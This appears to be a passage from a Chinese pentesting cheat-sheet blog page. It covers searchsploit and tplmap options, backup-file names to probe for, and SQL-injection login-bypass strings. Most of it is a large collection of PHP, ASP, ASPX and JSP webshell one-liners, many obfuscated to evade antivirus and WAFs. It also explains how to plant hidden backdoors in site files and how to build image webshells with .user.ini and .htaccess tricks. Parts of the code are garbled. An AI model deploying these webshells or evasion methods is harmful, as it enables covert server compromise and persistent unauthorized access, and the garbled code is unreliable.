term3”。</h1><h1 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h1><ul><li>你可以使用任意数量的搜索词。</li><li>Search terms are not case-sensitive (by default), and ordering is irrelevant.</li><li>搜索术语不区分大小写(默认情况下)，而排序则无关紧要。</li><li>如果你想用精确的匹配来过滤结果，请使用用 -e 参数</li><li>使用’ - t ‘将文件的路径排除，以过滤搜索结果</li><li>删除误报(特别是在搜索使用数字时 - i.e. 版本).</li><li>当更新或显示帮助时，搜索项将被忽略。<br>searchsploit [options] term1 [term2] … [termN]<br>searchsploit [选项] 关键字1 [关键字2] … [关键字N]</li></ul><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p>-c, –case[Term]执行区分大小写的搜索，缺省是对大小写不敏感。<br>-e, –exact [Term]对exploit标题执行EXACT匹配（默认为AND）<br>-h, –help在屏幕上显示帮助<br>-j, –json[Term]以JSON格式显示结果<br>-m, –mirror [EDB-ID]将一个漏洞利用镜像（副本）到当前工作目录，后面跟漏洞ID号<br>-o, –overflow [Term]Exploit标题被允许溢出其列<br>-p, –path[EDB-ID]显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br>-t, –title[Term]仅仅搜索漏洞标题（默认是标题和文件的路径）<br>-u, –update检查并安装任何exploitdb软件包更新（deb或git）<br>-w, –www [Term]显示<a href="http://exploit-db.com的url而不是本地路径(在线搜索)/">http://Exploit-DB.com的URL而不是本地路径（在线搜索）</a><br>-x, –examine[EDB-ID]使用$ PAGER检查（副本）漏洞利用<br>-v –verbose 显示更多的输出信息<br>–colour在搜索结果中禁用颜色突出显示.<br>–id显示EDB-ID值而不是本地路径<br>–nmap[file.xml]使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br>使用实例</p><h3 id="漏洞更新"><a href="#漏洞更新" class="headerlink" title="漏洞更新"></a>漏洞更新</h3><p>searchsploit -u</p><h3 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h3><p>基本搜索会同时匹配标题和路径中的内容<br>如:searchsploit smb windows remote</p><h3 id="标题搜索"><a href="#标题搜索" class="headerlink" title="标题搜索"></a>标题搜索</h3><p>标题搜索只匹配标题,不会对路径中的关键词进行匹配<br>如:searchsploit -t smb windows remote</p><h3 id="联网搜索"><a href="#联网搜索" class="headerlink" title="联网搜索"></a>联网搜索</h3><p>searchsploit EternalBlue</p><h3 id="复制到文件夹"><a href="#复制到文件夹" class="headerlink" title="复制到文件夹"></a>复制到文件夹</h3><p>不建议在本地的漏洞数据库中修改exp,建议使用-m参数复制那些有用的到当前的工作目录<br>如:searchsploit -m 42031.py</p><h3 id="复制到剪贴板"><a href="#复制到剪贴板" class="headerlink" title="复制到剪贴板"></a>复制到剪贴板</h3><p>-p参数可以获取更多关于该漏洞的信息,以及将完整的路径复制到剪贴板上(如果可能的话)<br>如:searchsploit -p 42031.py</p><h3 id="删除不想要的结果"><a href="#删除不想要的结果" class="headerlink" title="删除不想要的结果"></a>删除不想要的结果</h3><p>使用–exclude&#x3D;选项删除不想要的结果<br>如:searchsploit smb windows remote –exclude&#x3D;”(POC)|txt”<br>利用管道输出(删除不想要的结果的另一种方法)<br>如:searchsploit smb windows remote | grep rb 只显示rb文件</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>查询关键字使用的是AND运输，关键字越多，过滤的也就越多，结果也就越准确；使用名称搜索最好是使用全称；如果要搜索微软的漏洞，可以直接使用searchsploit 搜索微软漏洞名称或者漏洞的编号和名字。</p><h2 id="tplmap"><a href="#tplmap" class="headerlink" title="tplmap"></a>tplmap</h2><p>基于python2<br>Usage: python tplmap.py [options]</p><h3 id="选项-1"><a href="#选项-1" class="headerlink" title="选项:"></a>选项:</h3><p>  -h, –help          显示帮助并退出</p><h3 id="目标"><a href="#目标" class="headerlink" title="目标:"></a>目标:</h3><p>  -u URL, –url&#x3D;URL   目标 URL<br>  -X REQUEST, –re..  强制使用给定的HTTP方法 (e.g. PUT)</p><h3 id="请求"><a href="#请求" class="headerlink" title="请求:"></a>请求:</h3><p>  -d DATA, –data&#x3D;..  通过POST发送的数据字符串 它必须作为查询字符串: param1&#x3D;value1&amp;param2&#x3D;value2<br>  -H HEADERS, –he..  附加标头 (e.g. ‘Header1: Value1’) 多次使用以添加新的标头<br>  -c COOKIES, –co..  Cookies (e.g. ‘Field1&#x3D;Value1’) 多次使用以添加新的Cookie<br>  -A USER_AGENT, -..  HTTP User-Agent 标头的值<br>  –proxy&#x3D;PROXY       使用代理连接到目标URL</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测:"></a>检测:</h3><p>  –level&#x3D;LEVEL       要执行的代码上下文转义级别 (1-5, Default: 1)<br>  -e ENGINE, –eng..  强制将后端模板引擎设置为此值<br>  -t TECHNIQUE, –..  技术 R:渲染 T:基于时间的盲注 Default: RT</p><h3 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问:"></a>操作系统访问:</h3><p>  –os-cmd&#x3D;OS_CMD     执行操作系统命令<br>  –os-shell          提示交互式操作系统Shell<br>  –upload&#x3D;UPLOAD     上传本地文件到远程主机<br>  –force-overwrite   上传时强制覆盖文件<br>  –download&#x3D;DOWNL..  下载远程文件到本地主机<br>  –bind-shell&#x3D;BIN..  在目标的TCP端口上生成系统Shell并连接到它<br>  –reverse-shell&#x3D;..  运行系统Shell并反向连接到本地主机端口</p><h3 id="模板检查"><a href="#模板检查" class="headerlink" title="模板检查:"></a>模板检查:</h3><p>  –tpl-shell         在模板引擎上提示交互式Shell<br>  –tpl-code&#x3D;TPL_C..  在模板引擎中注入代码</p><h3 id="常规"><a href="#常规" class="headerlink" title="常规:"></a>常规:</h3><p>  –force-level&#x3D;FO..  强制将测试级别设置为此值<br>  –injection-tag&#x3D;..  使用字符串作为注入标签 (default ‘*’)</p><hr><h1 id="常见备份文件"><a href="#常见备份文件" class="headerlink" title="常见备份文件"></a>常见备份文件</h1><p>备份文件常见的后缀名<br>备份文件基本上都是压缩包<br><a href="http://www.zip/">www.zip</a><br>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>对于bak类的备份文件，可以直接输入文件名称+.bak访问例如：<br>index.php.bak<br>.txt<br>.old<br>.temp<br>_index.html<br>.swp<br>.sql<br>.tgz<br>tar<br>备份文件常见的文件名<br>文件名不包含后缀<br>web<br>website<br>backup<br>back<br>www<br>wwwroot<br>temp<br>db<br>data<br>code<br>test<br>admin<br>user<br>sql<br>常见的备份文件所在目录<br>&#x2F; #根目录首先<br>&#x2F;admin<br>&#x2F;data<br>&#x2F;default<br>&#x2F;index<br>&#x2F;login<br>&#x2F;manage<br>&#x2F;cmseditor<br>&#x2F;db<br>&#x2F;bbs<br>&#x2F;phpadmin </p><hr><h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><p>‘ or 1&#x3D;’1<br>‘or’&#x3D;’or’<br>admin<br>admin’–<br>admin’ or 4&#x3D;4–<br>admin’ or ‘1’&#x3D;’1’–<br>admin888<br>“or “a”&#x3D;”a<br>admin’ or 2&#x3D;2#<br>a’ having 1&#x3D;1#<br>a’ having 1&#x3D;1–<br>admin’ or ‘2’&#x3D;’2<br>‘)or(‘a’&#x3D;’a<br>or 4&#x3D;4–<br>c<br>a’or’ 4&#x3D;4–<br>“or 4&#x3D;4–<br>‘or’a’&#x3D;’a<br>“or”&#x3D;”a’&#x3D;’a<br>‘or’’&#x3D;’<br>‘or’&#x3D;’or’<br>1 or ‘1’&#x3D;’1’&#x3D;1<br>1 or ‘1’&#x3D;’1’ or 4&#x3D;4<br>‘OR 4&#x3D;4%00<br>“or 4&#x3D;4%00<br>‘xor<br>admin’ UNION Select 1,1,1 FROM admin Where ‘’&#x3D;’<br>1<br>-1%cf’ union select 1,1,1 as password,1,1,1 %23<br>1<br>17..admin’ or ‘a’&#x3D;’a 密码随便<br>‘or’&#x3D;’or’<br>‘or 4&#x3D;4&#x2F;*<br>something<br>‘ OR ‘1’&#x3D;’1<br>1’or’1’&#x3D;’1<br>admin’ OR 4&#x3D;4&#x2F;*<br>1’or’1’&#x3D;’1<br>asp aspx万能密码<br>1：”or “a”&#x3D;”a<br>2： ‘)or(‘a’&#x3D;’a<br>3：or 1&#x3D;1–<br>4：’or 1&#x3D;1–<br>5：a’or’ 1&#x3D;1–<br>6：”or 1&#x3D;1–<br>7：’or’a’&#x3D;’a<br>8：”or”&#x3D;”a’&#x3D;’a<br>9：’or”&#x3D;’<br>10：’or’&#x3D;’or’<br>11: 1 or ‘1’&#x3D;’1’&#x3D;1<br>12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br>13: ‘OR 1&#x3D;1%00<br>14: “or 1&#x3D;1%00<br>15: ‘xor<br>16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”&#x3D;’ （替换表名admin）<br>密码 1<br>17…admin’ or ‘a’&#x3D;’a 密码随便<br>PHP万能密码<br>‘or 1&#x3D;1&#x2F;*<br>User: something<br>Pass: ’ OR ‘1’&#x3D;’1<br>jsp 万能密码<br>1’or’1’&#x3D;’1<br>admin’ OR 1&#x3D;1&#x2F;* </p><hr><h1 id="一句话大全"><a href="#一句话大全" class="headerlink" title="一句话大全"></a>一句话大全</h1><p>原文链接：<a href="https://blog.csdn.net/qq_44632668/article/details/97818432">https://blog.csdn.net/qq_44632668/article/details/97818432</a></p><p>PHP</p><pre> <body><? @system($_GET["cc"]); ?></body> </pre>      <p>&#x2F;&#x2F;可执行命令一句话<br>普通一句话</p><?php eval($_POST[cc123]) ?><?php @eval($_POST['cc123']);?><p>PHP系列</p><?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["xindong"]); ?><?php $lang = (string)key($_POST);$lang($_POST['xindong']);?><?php $k="ass"."ert"; $k(${"_PO"."ST"} ['xindong']);?><?php  $a = "a"."s"."s"."e"."r"."t";  $a($_POST["xindong"]);  ?><?php                  @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";                  @$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";                  @$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}                  [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);?><pre><code>密码是  -7</code></pre><p>过狗一句话</p><p>select ‘<?php @eval($_POST[cmd]);?>‘ into outfile ‘C:&#x2F;Inetpub&#x2F;wwwroot&#x2F;mysql-php&#x2F;1.php’</p><pre><code>1</code></pre><?phphbCgkX1BPU1RbMV0p")); ?> <?php $_REQUEST['a']($_REQUEST['b']); ?> <?php $t=$_GET['t']; $tt=$_GET['tt']; $s=t;$s($REQUEST[′cc123′]);?><?php$t=$GET[′t′];//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=sert$s=t.$ttt; $s($_REQUEST['cc']);?> <?php $t=$_GET['t']; //t=tt $tt=$_GET['tt']; //tt=as $ttt=$_GET['ttt']; //ttt=s $tttt=$_GET['tttt']; //ttt=ert $s=t.$ttt.$tttt;$s($REQUEST[′cc′]);?><?php$t=$GET[′t′];//t=tt$tt=$GET[′tt′];//tt=as$ttt=$GET[′ttt′];//ttt=tttt$tttt=$GET[′tttt′];//ttt=sert$s=t.ttt;$s($REQUEST[′cc′]);?><?php$a=$REQUEST[′a′];//a=b;$b=$REQUEST[′b′];//b=as;$c=$REQUEST[′c′];//c=sert;$d=$REQUEST[′d′];//d=c;$e=a.d;$e($REQUEST[′cc′]);?><?php$a=$REQUEST[′a′];//a=assert;$b=$REQUEST[′b′];//b=a;$d=b; $d($_REQUEST['cc']); ?><p>PHP过狗<br><?php if($_POST[x]!=''){$a="base64_decode"; eval($a($_POST[z0]));}?> 密码：x</p><p>&lt;%a&#x3D;request(“gold”)%&gt;&lt;%eval a%&gt;</p><p>fuck<?phpeval($_POST[a])?><br><?php $a=range(1,200);$b=chr($a[96]).chr($a[114]).chr($a[114]).chr($a[100]).chr($a[113]).chr($a[115]); $b(${chr($a[94]).chr($a[79]).chr($a[78]).chr($a[82]).chr($a[83])}[chr($a[51])]); ?> 密码 4</p><p>该日志目录不存在或权限不足，请检查设置！<?phpeval($_POST[a])?><br>几个变性的php–过防火墙</p><p>过狗效果都不错：<br><?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?> <?php $lang = (string)key($_POST);$lang($_POST['sz']); ?> <?php $k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);?> <?php $a = "a"."s"."s"."e"."r"."t"; $a($_POST["sz"]); ?></p><p>这个是90发的&lt;?php</p><p>@$_&#x3D;“s”.“s”.&#x2F;-&#x2F;-&#x2F;“e”.&#x2F;-&#x2F;-&#x2F;“r”;</p><p>@ &#x3D; &#x2F; ∗ − &#x2F; ∗ − ∗ &#x2F; &quot; a &quot; . &#x2F; ∗ − &#x2F; ∗ − ∗ &#x2F; <em>&#x3D;&#x2F;<em>-&#x2F;</em>-<em>&#x2F;&quot;a&quot;.&#x2F;</em>-&#x2F;<em>-</em>&#x2F; &#x3D;​&#x2F;∗−&#x2F;∗−∗&#x2F;“a”.&#x2F;∗−&#x2F;∗−∗&#x2F;</em>.&#x2F;-&#x2F;-*&#x2F;“t”;</p><p>@ &#x2F; ∗ − &#x2F; ∗ − ∗ &#x2F; ( _&#x2F;<em>-&#x2F;</em>-<em>&#x2F;( &#x2F;​∗−&#x2F;∗−∗&#x2F;(&#x2F;-&#x2F;-&#x2F;{“_P”.&#x2F;-&#x2F;-&#x2F;“OS”.&#x2F;-&#x2F;-</em>&#x2F;“T”}</p><p>[&#x2F;-&#x2F;-&#x2F;0&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;2&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;5&#x2F;-&#x2F;-&#x2F;]);?&gt;<br>密码-7<br>phpv9 高版本拿shell<br><?php file_put_contents('c7.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2NjMjc4OV0pOz8+')); ?></p><p>…&#x2F;…&#x2F;…&#x2F;…&#x2F;html&#x2F;special&#x2F;cc&#x2F;index<br>ASP<br>asp 一句话</p><p>&lt;%execute(request(“cmd”))%&gt;<br>&lt;%execute request(“1”)%&gt;<br>ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾 密码a<br>“%&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%’ p</p><p>&lt;%Y&#x3D;request(“xindong”)%&gt; &lt;%execute(Y)%&gt;</p><p>&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%&gt;</p><p>&lt;%eval””&amp;(“e”&amp;“v”&amp;“a”&amp;“l”&amp;”(“&amp;“r”&amp;“e”&amp;“q”&amp;“u”&amp;“e”&amp;“s”&amp;“t”&amp;”(“&amp;“0”&amp;”-“&amp;“2”&amp;”-“&amp;“5”&amp;”)”&amp;”)”)%&gt;（密码是-7）<br>ASP过安全狗一句话</p><p>密码（pass）</p><p>&lt;% %&gt;</p><p>&lt;%a&#x3D;request(“zl”)%&gt;&lt;%eval a%&gt;<br>ASPX系列</p><p>ASPX一句话的 过安全狗效果不怎么样</p><p>不过我认为能支持aspx 百分之8&#x2F;90支持asp</p><p>&lt;%@ Page Language &#x3D; Jscript %&gt;<br>&lt;%var&#x2F;-&#x2F;-&#x2F;P&#x2F;-&#x2F;-&#x2F;&#x3D;&#x2F;-&#x2F;-&#x2F;“e”+“v”+&#x2F;-&#x2F;-&#x2F;<br>“a”+“l”+”(“+“R”+“e”+&#x2F;-&#x2F;-&#x2F;“q”+“u”+“e”&#x2F;-&#x2F;-&#x2F;+“s”+“t”+<br>“[&#x2F;-&#x2F;-&#x2F;0&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;2&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;5&#x2F;-&#x2F;-&#x2F;]”+<br>“,”+”””+“u”+“n”+“s”&#x2F;-&#x2F;-&#x2F;+“a”+“f”+“e”+”””+”)”;eval<br>(&#x2F;-&#x2F;-&#x2F;P&#x2F;-&#x2F;-&#x2F;,&#x2F;-&#x2F;-&#x2F;“u”+“n”+“s”&#x2F;-&#x2F;-&#x2F;+“a”+“f”+“e”&#x2F;-&#x2F;-&#x2F;);%&gt; 密码 -7</p><p>&lt;%@ Page Language&#x3D;“Jscript”%&gt;&lt;%eval(Request.Item[“xindong”],“unsafe”);%&gt;<br>密码是webadmin<br>aspx一句话</p><p>&lt;%@ Page Language&#x3D;“Jscript” validateRequest&#x3D;“false” %&gt;&lt;%Response.Write(eval(Request.Item[“w”],“unsafe”));%&gt;<br>JSP</p><p>&lt;%if(request.getParameter(“f”)!&#x3D;null)(new java.io.FileOutputStream(application.getRealPath(“&#x2F;“)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;</p><p>select ‘<?php eval($_POST[cmd];?>’ into outfile ‘C:&#x2F;Inetpub&#x2F;wwwroot&#x2F;mysql-php&#x2F;1.php’<br>过护卫神的</p><p>&lt;%E&#x3D;request(“1”)%&gt;abc</p><p>123456789<br>&lt;%execute E%&gt;</p><p>原来代码是&lt;%execute request(“cmd”)%&gt; 把标签修改替换下来 为</p><p>&lt;scriptlanguage&#x3D;VBScript runat&#x3D;server&gt;execute request(“cmd”) 这样就避开了&lt;%,%&gt;符号！</p><p>表中数据段限制，一句话木马也写不下的情况</p><p>网络中流传的最小的木马代码是&lt;%eval request(“#”)%&gt; 如过连这也写不下怎么办？</p><p>将木马分开写就好了！ &lt;%Y&#x3D;request(“x”)%&gt; &lt;%execute(Y)%&gt; 这样分开写提交到数据库就没问题了！</p><p>不过，在ACCESS数据库中新增加的数据物理位置是在旧数据之前的，所以要先写&lt;%execute(Y)%&gt;部分。写好后在客户端写密码时除了填写”x”以外的任何字符都可以，如果填了”x”就会出错！</p><p>插入一句话容易爆错</p><p>例如</p><p>Sub unlockPost()</p><p>Dim id,replyid,rs,posttable</p><p>id&#x3D;Request(“id”)</p><p>replyid&#x3D;Request(“replyid”)</p><p>If Not IsNumeric(id) or id&#x3D;”” Then</p><p>写成</p><p>Sub unlockPost(&lt;%eval request(“#”)%&gt;)</p><p>Dim id,replyid,rs,posttable</p><p>id&#x3D;Request(“id”)</p><p>replyid&#x3D;Request(“replyid”)</p><p>If Not IsNumeric(id) or id&#x3D;”” Then</p><p>就可以了，也可以写成带容错语句的格式！！</p><p>&lt;%if request(“cmd”)&lt;&gt;””then execute request(“cmd”)%&gt;</p><p>一句话木马到两句话木马的转型!</p><p>一句话木马服务端原型:&lt;%execute request(“value”)%&gt; ,</p><p>变形后:&lt;%On Error Resume Next execute request(“value”)%&gt; ,</p><p>至于为什么要用两句话木马呢,是由于使我们的后门更加隐蔽.</p><p>我也试过用一句话插入WellShell的某个ASP文件里面,可是访问时经常出错,而插入两句话木马服务端却可以正常访问了,对站点的页面无任何影响.</p><p>这样就达到了隐蔽性更强的目的了,他管理员总不会连自己的网页文件都删了吧.</p><p>现在我的WellShell都有这样的后门.选择要插入两句话木马的ASP文件要注意,选一些可以用IE访问的ASP文件,不要选conn.asp这样的文件来插入.</p><p>当然,连接两句话木马的客户端仍然是用一句木马的客户端,不用修改.</p><p>一句话免杀：</p><p>一：变形法</p><p>比如：eval(request(“#”))这样的马儿呢，一般情况下是不被杀的。但实际上，经常杀毒软件会把eval(request列为特征码。所以我们变形一下</p><p>E&#x3D;request(“id”)</p><p>eval(E)</p><p>这样可达到免杀的目的。</p><p>例如：&lt;%execute request(“1”)%&gt; 变形后：</p><p>&lt;%E&#x3D;request(“1”)</p><p>execute E%&gt;</p><p>当然，这种变形是最好做的。</p><p>介绍第二种方法：因为很多管理员很聪明，它会检查ASP文件中的execute和eval函数。所以呢，不管你怎么反编译，它最终总是要用其中的一个函数来解释运行，所以还是被发现了。好么，我们用外部文件来调用。建一个a.jpg或者任何不被发现的文件后缀或文件名。写入 execute(request(“#”))当然，你可以先变形后现放上去。然后在ASP文件中插入</p><p>来引用它，即可。</p><p>不过，管理员可以通过对比文件的方式找到修改过的文件，不过这种情况不多。</p><p>在WEBSHeLL中使用命令提示</p><p>在使用ASP站长助手6.0时点击命令提示符显示“没有权限”的时候，可以使用ASP站长助手上传CMD.exe到你的WEBSHELL目录（其它目录也行，把上传以后的CMD.exe绝对路径COPY出来），再修改你的WEBSHELL找到调用CMD.EXE的代码。原来的代码如下</p><p>.exec(“cmd.exe &#x2F;c “&amp;DefCmd).stdout.readall</p><p>修改为</p><p>.exec(“你想上传的cmd.exe绝对路径” &#x2F;c”&amp;DefCmd).stdout.readall</p><p>比如你上传到的目录是D：\web\www\cmd.exe,那么就修改成</p><p>.exec(“D：\web\www\cmd.exe &#x2F;c”&amp;DefCmd).stdout.readall<br>支持变异菜刀连接以过安全狗,过啊D 文件扫描的一句话</p><p>实已经不是一句话了，好几句了都。<br>继续上次的：我使用的一句话的几种姿态</p><p>这回研究了下PHP，发一下我使用的一句话（可过文件扫描）。<br>ASP<br><?php $mujj = $_POST['z']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); } ?></p><p>密码z，支持菜刀连接；支持变异菜刀连接以过安全狗。</p><p>另外：<br>ASP</p><p>&lt;% Function MorfiCoder(Code) MorfiCoder&#x3D;Replace(Replace(StrReverse(Code),”&#x2F;&#x2F;“,””””),”*”,vbCrlf)<br>End Function<br>Execute MorfiCoder(“)&#x2F;&#x2F;z&#x2F;*&#x2F;(tseuqer lave”) %&gt;<br>ASPX<br>&lt;% popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(“UmVxdWVzdC5JdGVtWyJ6Il0&#x3D;”)))); %&gt;<br>大家伙 把你们手中好的发出来共享下吧 别藏着了</p><p>分享是交流的关键，我不喜欢什么大马 小马 一句话是我的最爱，不仅隐藏性高 免杀效果好 而且无后门（当然排除菜刀有） —- 没禁用一句话post的情况下。</p><?phpsession_start();$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);$_SESSION['theCode'] && preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');?><p>此方法用两个文件实现：<br>文件1<br><?phpheader('Content-type:text/html;charset=utf-8');parse_str($_SERVER['HTTP_REFERER'], $a);if(reset($a) == '10' && count($a) == 9) { eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));}?><br>文件2<br><?phpheader('Content-type:text/html;charset=utf-8');//要执行的代码$code = <<<CODEphpinfo();CODE;//进行base64编码$code = base64_encode($code);//构造referer字符串$referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";//后门url$url = 'http://localhost/test1/1.php';$ch = curl_init();$options = array( CURLOPT_URL => $url, CURLOPT_HEADER => FALSE, CURLOPT_RETURNTRANSFER => TRUE, CURLOPT_REFERER => $referer);curl_setopt_array($ch, $options);echo curl_exec($ch);?><br>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。<br><?php ($_=@$_GET[2]).@$_($_POST[1]) ?><br>在菜刀里写<a href="http://site/1.php?2=assert%E5%AF%86%E7%A0%81%E6%98%AF1">http://site/1.php?2=assert密码是1</a><br><?php$_="";$_[+""]='';$_="$_"."";$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");?><?php${'_'.$_}['_'](${'_'.$_}['__']);?><br>在菜刀里写<a href="http://site/2.php?=assert&__=eval($POST%5B%27pass%27%5D)">http://site/2.php?=assert&amp;__=eval($POST[&#39;pass&#39;])</a> 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。<br>($b4dboy &#x3D; $<em>POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘&#x2F;ad&#x2F;e’,‘@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);<br>str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！<br>高级的PHP一句话木马后门<br>1、$hh &#x3D; “p”.”r”.”e”.”g”.”</em>“.”r”.”e”.”p”.”l”.”a”.”c”.”e”;$hh(“&#x2F;[discuz]&#x2F;e”,$_POST[‘h’],”Access”);&#x2F;一句话2、$filename&#x3D;$_GET[‘xbid’];include ($filename);&#x2F;&#x2F;危险的include函数，直接编译任何文件为php格式运行3、$reg&#x3D;”c”.”o”.”p”.”y”;$reg($_FILES[MyFile][tmp_name],$<em>FILES[MyFile][name]);&#x2F;&#x2F;重命名任何文件4、$gzid &#x3D; “p”.”r”.”e”.”g”.”</em>“.”r”.”e”.”p”.”l”.”a”.”c”.”e”;$gzid(“&#x2F;[discuz]&#x2F;e”,$_POST[‘h’],”Access”);&#x2F;一句话5、include ($uid);&#x2F;&#x2F;危险的include函数，直接编译任何文件为php格式运行，POST <a href="http://www.xxx.com/index.php?uid=/home/www/bbs/image.gif//gif%E6%8F%92%E4%B8%80%E5%8F%A5%E8%AF%9D6%E3%80%81%E7%A8%8B%E5%BA%8F%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81">www.xxx.com/index.php?uid=/home/www/bbs/image.gif//gif插一句话6、程序后门代码</a><?php eval_r($_POST[sb])?>程序代码<?php @eval_r($_POST[sb])?>&#x2F;&#x2F;容错代码程序代码<?php assert($_POST[sb]);?>&#x2F;&#x2F;使用lanker一句话客户端的专家模式执行相关的php语句程序代码<?$_POST['sa']($_POST['sb']);?>程序代码<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>程序代码<?php@preg_replace("/[email]/e",$_POST['h'],"error");?>&#x2F;&#x2F;使用这个后,使用菜刀一句话客户端在配置连接的时候在”配置”一栏输入程序代码<O>h&#x3D;@eval_r($_POST1);</O>程序代码<script language="php">@eval_r($_POST[sb])</script>&#x2F;&#x2F;绕过&lt;?限制的一句话</p><hr><h1 id="简易图片马"><a href="#简易图片马" class="headerlink" title="简易图片马"></a>简易图片马</h1><p>图片马:就是在图片中隐藏一句话木马。利用.htaccess等解析图片为PHP或者asp文件。达到执行图片内代码目的<br>制作方法:<br>文本方式打开,末尾粘贴一句话木马<br>cmd中 copy 1.jpg&#x2F;b+2.php 3.jpg<br>copy test1.jpg&#x2F;b+test2.asp&#x2F;a test3.jpg<br>&#x2F;b是二进制形式打开<br>&#x2F;a是ascii方式打开<br>看到有人说一定要把图片放前面,木马放后面才能成功,我亲自试了这两种制作方式(另一种图片放后面),均能成功连接,但是后者的一句话木马在文件开头,不推荐<br>16进制打开图片在末尾添加一句话木马。<br>ps<br>注意以下几点:<br>单纯的图片马并不能直接和蚁剑连接，<br>因为该文件依然是以image格式进行解析，<br>只有利用文件包含漏洞，才能成功利用该木马<br>所谓文件包含漏洞，是指在代码中引入其他文件作为php文件执行时，未对文件进行严格过滤，导致用户指定任意文件，都作为php文件解析执行。</p><h2 id="user-ini-有php就能用"><a href="#user-ini-有php就能用" class="headerlink" title=".user.ini 有php就能用"></a>.user.ini 有php就能用</h2><p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。<br>实例<br>php 配置项中有两个配置可以起到一些作用<br>auto_prepend_file &#x3D; <filename> &#x2F;&#x2F;包含在文件头<br>auto_append_file &#x3D; <filename> &#x2F;&#x2F;包含在文件尾<br>这两个配置项的作用相当于一个文件包含，比如<br>&#x2F;&#x2F; .user.ini<br>auto_prepend_file &#x3D; 1.jpg<br>&#x2F;&#x2F; 1.jpg<br><?php phpinfo();?><br>&#x2F;&#x2F; 1.php(任意php文件)<br>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句require(‘1.png’)，进行了文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。<br>.user.ini使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。<br>局限<br>在.user.ini中使用这条配置也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。<br>但是有时可以使用 ..&#x2F; 来将文件上传到其他目录，达到一个利用的效果。<br>.user.ini<br>第一步<br>GIF89a<br>auto_prepend_file &#x3D; 1.jpg</p><h2 id="htaccess-只能apache"><a href="#htaccess-只能apache" class="headerlink" title=".htaccess 只能apache"></a>.htaccess 只能apache</h2><p>.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。<br>在绕过文件上传的限制中，在Apache全局配置文件中httpd.conf有这样一条配置<br>AddType application&#x2F;x-httpd-php .php .phtml .php5 .pht .phps<br>￼<br>这里配置的意思就是将以.php .phtml .php5 .pht .phps为后缀的文件按php文件进行解析。<br>AddType application&#x2F;x-httpd-php (.jpg) &#x2F;&#x2F;将所有文件按照php文件进行解析（将jpg文件按照php文件进行解析）<br>我们来看一个例题来帮助理解。<br>[MRCTF2020]你传你*呢<br>经过测试发现上传的jpg通过修改后缀名上传成功但后台仍然无法解析我们上传的shell故使用.htaccess文件进行一次“包含”<br>先上传一个.htaccess文件内容如下<br>&lt;FilesMatch “a.png”&gt;SetHandler 